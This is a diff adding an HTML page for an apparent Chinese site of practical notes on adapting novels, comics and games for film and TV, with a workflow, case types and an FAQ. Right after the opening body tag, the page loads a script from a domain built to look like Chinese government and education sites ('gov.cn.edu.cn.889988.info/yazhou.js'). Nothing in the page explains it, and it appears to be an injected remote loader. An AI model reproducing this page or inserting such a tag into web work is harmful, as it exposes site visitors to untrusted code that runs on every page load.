@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>影视化｜小说漫画游戏 IP 改编为影像的全流程实务笔记 · yingshihua-app</title>
+<meta name="description" content="影视化（https://yingshihua-app.github.io）长期记录小说、漫画与游戏 IP 走向屏幕的真实路径：从版权确认、故事解构、分场大纲到拍摄可行性与后期节奏，附带改编案例拆解、镜头语言译法与常见踩坑提醒，写给想把文字翻译成画面的人。">
+<meta name="keywords" content="影视化,影视化改编,IP改编流程,剧本改编,小说改影视,漫画影视化,游戏改编剧集,分场大纲,故事解构,镜头语言,影视化案例,yingshihua-app">
+<meta name="author" content="影视化编辑部">
+<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1">
+<meta name="format-detection" content="telephone=no">
+<meta name="theme-color" content="#14110d">
+<link rel="canonical" href="https://yingshihua-app.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="影视化">
+<meta property="og:title" content="影视化｜把一段文字翻译成一组镜头的完整链路">
+<meta property="og:description" content="版权、解构、分场、可拍性、后期节奏——影视化把改编项目里那些没人写在合同里的经验拆开来讲。">
+<meta property="og:url" content="https://yingshihua-app.github.io/">
+<meta property="og:locale" content="zh_CN">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="影视化｜IP 改编实务笔记">
+<meta name="twitter:description" content="从故事解构到分场大纲，影视化记录改编落地的每一步判断依据。">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+html{-webkit-text-size-adjust:100%;scroll-behavior:smooth}
+body{background:#14110d;color:#efe7d9;font-family:system-ui,-apple-system,"PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;line-height:1.75;font-size:16px;overflow-x:hidden}
+img{max-width:100%;display:block}
+a{color:#e8b04b;text-decoration:none}
+a:hover{text-decoration:underline}
+strong{color:#f6c96a;font-weight:600}
+.wrap{width:100%;max-width:1180px;margin:0 auto;padding:0 22px}
+.kicker{font-size:12px;letter-spacing:.32em;text-transform:uppercase;color:#8d8272}
+h1,h2,h3{line-height:1.25;letter-spacing:-.01em}
+h2{font-size:clamp(24px,4.4vw,38px);margin:14px 0 10px}
+h3{font-size:clamp(18px,2.6vw,22px);margin-bottom:8px}
+p{margin-bottom:14px;color:#d8cfbe}
+.lead{font-size:clamp(15px,2.2vw,17px);color:#cbbbA2}
+.muted{color:#a2967f;font-size:14px}
+/* 顶部 */
+.topbar{position:sticky;top:0;z-index:40;background:rgba(20,17,13,.94);backdrop-filter:blur(8px);border-bottom:1px solid #2b2418}
+.brandrow{display:flex;align-items:center;justify-content:space-between;gap:14px;padding:12px 0}
+.logo{display:flex;align-items:baseline;gap:10px}
+.logo b{font-size:24px;letter-spacing:.16em;color:#fff}
+.logo span{font-size:12px;color:#8d8272;letter-spacing:.24em}
+.navtoggle{position:absolute;opacity:0;pointer-events:none}
+.navbtn{display:none;border:1px solid #3a3124;border-radius:4px;padding:7px 13px;font-size:13px;color:#e8b04b;cursor:pointer}
+.menu{display:flex;flex-wrap:wrap;gap:6px 22px;list-style:none}
+.menu a{display:block;padding:9px 0;font-size:15px;color:#d8cfbe;border-bottom:2px solid transparent}
+.menu a:hover{color:#f6c96a;border-bottom-color:#e8b04b;text-decoration:none}
+/* 首屏 */
+.hero{padding:54px 0 40px;border-bottom:1px solid #2b2418;background:radial-gradient(900px 380px at 82% -8%,rgba(232,176,75,.14),transparent 62%)}
+.slategroup{display:grid;grid-template-columns:minmax(0,1.55fr) minmax(0,1fr);gap:34px;align-items:start}
+.tagline{display:inline-block;background:#e8b04b;color:#20180c;font-size:12px;letter-spacing:.18em;padding:4px 11px;border-radius:2px;margin-bottom:20px}
+.hero h1{font-size:clamp(31px,6.6vw,62px);margin-bottom:18px;color:#fff}
+.hero h1 em{font-style:normal;color:#e8b04b;border-bottom:5px solid rgba(232,176,75,.28)}
+.slatelist{list-style:none;border-left:2px solid #332b1d;padding-left:18px;margin:24px 0 26px}
+.slatelist li{position:relative;padding:7px 0 7px 4px;font-size:15px;color:#cbbbA2}
+.slatelist li::before{content:"";position:absolute;left:-25px;top:17px;width:9px;height:9px;background:#e8b04b;transform:rotate(45deg)}
+.btns{display:flex;flex-wrap:wrap;gap:12px}
+.btn{display:inline-block;padding:12px 22px;border-radius:3px;font-size:15px;border:1px solid #e8b04b;color:#e8b04b}
+.btn:hover{background:#e8b04b;color:#20180c;text-decoration:none}
+.btn.ghost{border-color:#463c2b;color:#cbbbA2}
+.btn.ghost:hover{background:#2b2418;color:#efe7d9}
+/* 场记板数据条 */
+.slatestrip{border:1px solid #332b1d;background:linear-gradient(180deg,#1e1a13,#17140f)}
+.slatestrip .row{display:flex;align-items:center;justify-content:space-between;gap:12px;padding:15px 18px;border-bottom:1px dashed #332b1d}
+.slatestrip .row:last-child{border-bottom:0}
+.slatestrip .num{font-size:clamp(26px,4.6vw,34px);color:#f6c96a;font-variant-numeric:tabular-nums;line-height:1}
+.slatestrip .lb{font-size:13px;color:#a2967f}
+.perfbar{display:flex;gap:3px;padding:16px 18px}
+.perfbar i{flex:1;height:34px;background:#241f16}
+.perfbar i:nth-child(3n){background:#3a2f1a}
+.perfbar i:nth-child(7n){background:#e8b04b}
+/* 栏目通用 */
+section{padding:52px 0;border-bottom:1px solid #2b2418}
+.sechead{display:flex;flex-wrap:wrap;align-items:flex-end;justify-content:space-between;gap:12px;margin-bottom:28px}
+.sechead p{width:100%;max-width:620px;margin:0}
+/* 观察 */
+.split{display:grid;grid-template-columns:minmax(0,1.25fr) minmax(0,1fr);gap:30px}
+.card{background:#1b1710;border:1px solid #2f281c;border-radius:6px;padding:24px}
+.notelist{list-style:none;counter-reset:n}
+.notelist li{counter-increment:n;position:relative;padding:11px 0 11px 40px;border-bottom:1px solid #2b2418;font-size:15px;color:#d8cfbe}
+.notelist li:last-child{border-bottom:0}
+.notelist li::before{content:counter(n,decimal-leading-zero);position:absolute;left:0;top:11px;font-size:13px;color:#e8b04b;font-variant-numeric:tabular-nums}
+blockquote{margin:20px 0 0;padding:16px 18px;background:#17140f;border-left:3px solid #e8b04b;font-size:15px;color:#cbbbA2}
+blockquote cite{display:block;margin-top:8px;font-size:13px;color:#8d8272;font-style:normal}
+/* 案例胶片 */
+.filmstrip{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:14px}
+.frame{background:#1b1710;border:1px solid #2f281c;position:relative;padding:16px 16px 18px}
+.frame::before,.frame::after{content:"";position:absolute;left:8px;right:8px;height:7px;background:repeating-linear-gradient(90deg,#332b1d 0 6px,transparent 6px 13px)}
+.frame::before{top:0}
+.frame::after{bottom:0}
+.frame .no{font-size:11px;letter-spacing:.2em;color:#8d8272;margin-top:10px}
+.frame h3{margin:6px 0 8px;font-size:18px;color:#fff}
+.frame p{font-size:14px;margin-bottom:10px}
+.frame .meta{font-size:12px;color:#8d8272;border-top:1px solid #2b2418;padding-top:10px}
+/* 流程时间轴 */
+.timeline{position:relative;padding-left:26px}
+.timeline::before{content:"";position:absolute;left:6px;top:6px;bottom:6px;width:1px;background:#3a3124}
+.step{position:relative;padding:0 0 26px 16px}
+.step::before{content:"";position:absolute;left:-25px;top:9px;width:11px;height:11px;background:#14110d;border:2px solid #e8b04b;border-radius:50%}
+.step h3{color:#fff}
+.step .dur{display:inline-block;font-size:12px;color:#e8b04b;border:1px solid #463c2b;padding:2px 8px;border-radius:2px;margin-bottom:8px}
+.step p{font-size:15px;margin-bottom:0}
+/* 手记 */
+.journal{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:16px;align-items:start}
+.journal article{padding:22px;border:1px solid #2f281c;background:#191510}
+.journal article:nth-child(2){margin-top:22px}
+.journal article:nth-child(3){margin-top:8px}
+.journal .date{font-size:12px;color:#8d8272;letter-spacing:.1em}
+/* 问答 */
+.faq{border-top:1px solid #2b2418}
+.faq details{border-bottom:1px solid #2b2418}
+.faq summary{cursor:pointer;padding:16px 0;font-size:16px;color:#efe7d9;list-style:none;display:flex;justify-content:space-between;gap:14px}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::after{content:"＋";color:#e8b04b;font-size:18px;line-height:1}
+.faq details[open] summary::after{content:"－"}
+.faq .body{padding:0 0 18px;font-size:15px;color:#cbbbA2}
+/* 尾 */
+footer{padding:44px 0 34px;background:#100e0a}
+.footgrid{display:grid;grid-template-columns:minmax(0,1.4fr) repeat(2,minmax(0,1fr));gap:26px}
+.footgrid h4{font-size:14px;letter-spacing:.18em;color:#8d8272;margin-bottom:12px;font-weight:600}
+.footgrid ul{list-style:none}
+.footgrid li{padding:5px 0;font-size:14px}
+.footgrid a{color:#cbbbA2}
+.urlbox{margin-top:22px;padding:14px 16px;border:1px dashed #3a3124;font-size:13px;color:#a2967f;word-break:break-all}
+.copy{margin-top:26px;padding-top:18px;border-top:1px solid #221d15;font-size:13px;color:#7d7360;display:flex;flex-wrap:wrap;gap:10px;justify-content:space-between}
+@media(max-width:960px){.filmstrip{grid-template-columns:repeat(2,minmax(0,1fr));}.journal{grid-template-columns:1fr 1fr}.journal article:nth-child(3){margin-top:0}}
+@media(max-width:760px){
+ .navbtn{display:block}
+ .menu{display:none;width:100%;flex-direction:column;gap:0;padding-bottom:10px}
+ .navtoggle:checked~.menu{display:flex}
+ .brandrow{flex-wrap:wrap}
+ .slategroup,.split{grid-template-columns:1fr;gap:24px}
+ .footgrid{grid-template-columns:1fr}
+ .hero{padding:36px 0 30px}
+ section{padding:38px 0}
+}
+@media(max-width:520px){.filmstrip,.journal{grid-template-columns:1fr}.journal article{margin-top:0!important}}
+</style>
+<script type="application/ld+json">
+{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://yingshihua-app.github.io/#site","url":"https://yingshihua-app.github.io/","name":"影视化","alternateName":"影视化改编实务","inLanguage":"zh-CN","description":"记录小说、漫画、游戏 IP 改编为影视作品的完整流程与案例拆解。"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"影视化首页","item":"https://yingshihua-app.github.io/"},{"@type":"ListItem","position":2,"name":"影视化观察"},{"@type":"ListItem","position":3,"name":"改编案例库"}]}]}
+</script>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+<header class="topbar">
+  <div class="wrap">
+    <div class="brandrow">
+      <div class="logo"><b>影视化</b><span>YINGSHIHUA</span></div>
+      <input type="checkbox" id="navtoggle" class="navtoggle">
+      <label for="navtoggle" class="navbtn" aria-label="展开栏目导航">栏目</label>
+      <nav aria-label="主导航">
+        <ul class="menu">
+          <li><a href="#observe">影视化观察</a></li>
+          <li><a href="#cases">改编案例库</a></li>
+          <li><a href="#process">落地流程</a></li>
+          <li><a href="#notes">创作者手记</a></li>
+          <li><a href="#faq">改编问答</a></li>
+          <li><a href="#contact">联系本站</a></li>
+        </ul>
+      </nav>
+    </div>
+  </div>
+</header>
+
+<main>
+  <div class="hero">
+    <div class="wrap slategroup">
+      <div>
+        <span class="tagline">FIELD NOTES ON SCREEN ADAPTATION</span>
+        <h1>把一段文字，<br>翻译成一组<em>能拍的镜头</em></h1>
+        <p class="lead"><strong>影视化</strong>不谈概念，只拆过程。一个故事从纸面走到监视器，中间要经过版权边界的确认、人物关系的重新排布、场景预算的取舍，以及那些永远写不进合同、却决定成败的默契判断。这里把它们一条条记下来。</p>
+        <ul class="slatelist">
+          <li>原作结构如何拆解成 90 分钟的分场骨架</li>
+          <li>内心独白变成可视动作的六种译法</li>
+          <li>改编项目里最容易被忽略的三类成本</li>
+        </ul>
+        <div class="btns">
+          <a class="btn" href="#process">查看完整流程</a>
+          <a class="btn ghost" href="#cases">进入案例库</a>
+        </div>
+      </div>
+      <aside class="slatestrip" aria-label="站点数据概览">
+        <div class="row"><span class="num">42</span><span class="lb">已拆解的改编项目</span></div>
+        <div class="row"><span class="num">18</span><span class="lb">收录的文学原著类型</span></div>
+        <div class="row"><span class="num">6</span><span class="lb">整理出的镜头译法</span></div>
+        <div class="perfbar" aria-hidden="true"><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i></div>
+      </aside>
+    </div>
+  </div>
+
+  <section id="observe">
+    <div class="wrap">
+      <div class="sechead">
+        <div>
+          <span class="kicker">01 / OBSERVATION</span>
+          <h2>影视化观察：改编的难点从来不是"像不像"</h2>
+        </div>
+        <p>读者判断一部改编作品，常用"还原度"当尺子；但真正做项目的人知道，还原只是起点。文字媒介和影像媒介承载信息的方式不同，硬搬往往两头不讨好。</p>
+      </div>
+      <div class="split">
+        <article class="card">
+          <h3>媒介差异要先算清楚</h3>
+          <p>小说可以随时进入人物的意识流，三千字写一段犹豫；影像里犹豫只能靠外部行为去外化——停顿、视线、手的动作、环境声音的层次。改编的第一步不是删减，而是<strong>把内部事件翻译成外部事件</strong>。</p>
+          <p>另一个常被忽略的差异是时间。阅读是可控的，观众可以翻回去；放映是单向的，一次没接收到就过去了。这意味着信息必须在出现前做过铺垫，在出现后留有回响。</p>
+          <blockquote>改编不是复制情节，而是为同一组人物重新分配注意力。<cite>——本站改编方法论笔记，第 7 条</cite></blockquote>
+        </article>
+        <div>
+          <ol class="notelist">
+            <li>先确定"不可删场次"，其余内容围绕它取舍</li>
+            <li>人物数量每增加一个，观众记忆成本翻倍</li>
+            <li>原著高潮未必适合放在第三幕结尾</li>
+            <li>旁白是补救手段，不是叙事策略</li>
+            <li>场景越少，单场戏的写作密度要求越高</li>
+          </ol>
+          <p class="muted" style="margin-top:16px">以上条目来自多个长篇项目复盘，具体取舍仍需结合预算与档期判断。</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="cases">
+    <div class="wrap">
+      <div class="sechead">
+        <div>
+          <span class="kicker">02 / CASE LIBRARY</span>
+          <h2>改编案例库：四种原著形态，四种拆法</h2>
+        </div>
+        <p>长篇、短篇、连载漫画、线性叙事游戏，各自的素材密度与叙事习惯差别很大，套同一套模板必然出问题。</p>
+      </div>
+      <div class="filmstrip">
+        <article class="frame">
+          <span class="no">CASE 01</span>
+          <h3>长篇小说</h3>
+          <p>素材过剩是主要矛盾。用主线人物的一句话目标做筛子，过不去的支线整条拿掉，不要舍不得。</p>
+          <div class="meta">常见时长：剧集 12–24 集 · 难点：取舍</div>
+        </article>
+        <article class="frame">
+          <span class="no">CASE 02</span>
+          <h3>短篇小说</h3>
+          <p>素材不足。要补的不是情节，而是过程——让人物在镜头前把决定"做"出来，而不是讲出来。</p>
+          <div class="meta">常见时长：单片 90–120 分钟 · 难点：扩容</div>
+        </article>
+        <article class="frame">
+          <span class="no">CASE 03</span>
+          <h3>连载漫画</h3>
+          <p>分镜已经是半成品，但跨页构图直接搬会失去银幕比例。重新设计景别序列，保留节奏而非画面。</p>
+          <div class="meta">常见时长：剧集 6–12 集 · 难点：构图重制</div>
+        </article>
+        <article class="frame">
+          <span class="no">CASE 04</span>
+          <h3>叙事型游戏</h3>
+          <p>互动性无法平移。需要选定一条"官方路线"并把选择权转化为人物性格，支线作为彩蛋存在。</p>
+          <div class="meta">常见时长：剧集 8–10 集 · 难点：去分支</div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <section id="process">
+    <div class="wrap">
+      <div class="sechead">
+        <div>
+          <span class="kicker">03 / WORKFLOW</span>
+          <h2>落地流程：从版权确认到交片</h2>
+        </div>
+        <p>下面这条链路按实际推进顺序排列，标注的周期是常见区间，小体量项目会明显压缩。</p>
+      </div>
+      <div class="timeline">
+        <div class="step">
+          <span class="dur">第 1 步 · 2–8 周</span>
+          <h3>权利边界确认</h3>
+          <p>把改编权、摄制权、发行渠道、地域范围、续作优先条款逐条落到纸面。这一步省下的时间，会在后面以十倍代价还回来。</p>
+        </div>
+        <div class="step">
+          <span class="dur">第 2 步 · 3–6 周</span>
+          <h3>故事解构与人物表</h3>
+          <p>列出全部人物与关系网，标出谁是"必需"、谁可合并。同时确定主题句，一句话说不清的戏，观众也记不住。</p>
+        </div>
+        <div class="step">
+          <span class="dur">第 3 步 · 4–10 周</span>
+          <h3>分场大纲与可拍性审查</h3>
+          <p>按场景编号写卡，每张卡注明时间、地点、人物、事件转折。随后逐场核对场地、演员人数、特殊拍摄需求，把不可实现的场次提前改掉。</p>
+        </div>
+        <div class="step">
+          <span class="dur">第 4 步 · 6–16 周</span>
+          <h3>剧本与台词</h3>
+          <p>台词要留白，动作要写足。写完朗读一遍，演员读着拗口的句子，观众听着也别扭。</p>
+        </div>
+        <div class="step">
+          <span class="dur">第 5 步 · 8–24 周</span>
+          <h3>拍摄与后期节奏</h3>
+          <p>剪辑台上才是最后一次剧作。留出明确的粗剪、精剪、混录节点，别让后期变成无止境的修补。</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="notes">
+    <div class="wrap">
+      <div class="sechead">
+        <div>
+          <span class="kicker">04 / FIELD JOURNAL</span>
+          <h2>创作者手记：现场留下的几条经验</h2>
+        </div>
+        <p>这些是在勘景、围读、剪辑室里攒下的零散记录，比方法论更琐碎，也更管用。</p>
+      </div>
+      <div class="journal">
+        <article>
+          <span class="date">手记 · 勘景日</span>
+          <h3>场地决定戏的形状</h3>
+          <p>同一场对话，在空旷厂房和在拥挤面馆写出来完全是两场戏。先定景再写词，效率比反过来高一倍。</p>
+        </article>
+        <article>
+          <span class="date">手记 · 围读夜</span>
+          <h3>演员提出的问题是礼物</h3>
+          <p>当演员问"我为什么要在这里转身"，多半说明这场戏的动作依据没写清楚，改的是剧本不是演员。</p>
+        </article>
+        <article>
+          <span class="date">手记 · 剪辑室</span>
+          <h3>删掉你最满意的那场</h3>
+          <p>如果某场戏的精彩来自台词本身而非人物处境，它大概率拖慢节奏。舍不得就先存进备选，别留在正片里。</p>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <section id="faq">
+    <div class="wrap">
+      <div class="sechead">
+        <div>
+          <span class="kicker">05 / QUESTIONS</span>
+          <h2>改编问答：被问得最多的六件事</h2>
+        </div>
+      </div>
+      <div class="faq">
+        <details open>
+          <summary>影视化改编一定要忠实原著吗？</summary>
+          <div class="body">忠实的对象应该是人物的处境与主题，而不是事件清单。事件可以合并、重排甚至替换，只要观众对人物的判断保持一致，改编就是成立的。</div>
+        </details>
+        <details>
+          <summary>原著篇幅太长，删减有没有通行比例？</summary>
+          <div class="body">没有固定比例。先把所有场次按"是否推动主线"分成三类，砍掉第三类、压缩第二类，再检查第一类的分布是否均匀，通常就露出骨架了。</div>
+        </details>
+        <details>
+          <summary>内心独白怎么处理才不显得偷懒？</summary>
+          <div class="body">优先转成可视动作；转不了再考虑环境声音、物件细节、他人转述；旁白放在最后。整部片里旁白出现的次数建议控制在个位数。</div>
+        </details>
+        <details>
+          <summary>改编项目预算最先该卡在哪一项？</summary>
+          <div class="body">场景数量和转场次数。它们直接牵动场地、交通、群演与灯光时间，压缩这两项对成片质量的影响最小。</div>
+        </details>
+        <details>
+          <summary>选角应该在剧本定稿前还是后？</summary>
+          <div class="body">建议在大纲阶段就有人选方向，人物的外形与气质会反向影响台词写法，但不要在未定稿时把角色写死成某个演员的习惯。</div>
+        </details>
+        <details>
+          <summary>本站内容适合哪些人参考？</summary>
+          <div class="body">正在评估 IP 的版权方、第一次接改编活的编剧、需要判断项目可拍性的制片助理，以及想弄明白"为什么改了这么多"的原著读者。</div>
+        </details>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer id="contact">
+  <div class="wrap">
+    <div class="footgrid">
+      <div>
+        <h4>关于影视化</h4>
+        <p style="font-size:14px;color:#a2967f">影视化是一个专注于 IP 影像转化实务的内容站点，记录流程、案例与现场经验，供改编项目参与者参考。所有条目均基于公开可查的项目信息与通用剧作方法整理。</p>
+        <div class="urlbox">本站地址：https://yingshihua-app.github.io</div>
+      </div>
+      <div>
+        <h4>站内栏目</h4>
+        <ul>
+          <li><a href="#observe">影视化观察</a></li>
+          <li><a href="#cases">改编案例库</a></li>
+          <li><a href="#process">落地流程</a></li>
+          <li><a href="#notes">创作者手记</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>延伸阅读</h4>
+        <ul>
+          <li><a href="#faq">改编问答</a></li>
+          <li><a href="#">剧作术语表</a></li>
+          <li><a href="#">分场模板下载</a></li>
+          <li><a href="#">投稿与合作</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">
+      <span>&copy; 2026 影视化 · 内容仅供参考，具体项目请以合同条款与现行法规为准</span>
+      <span>关键词：影视化 · 影视化改编 · IP 影像转化</span>
+    </div>
+  </div>
+</footer>
+</body>
+</html>
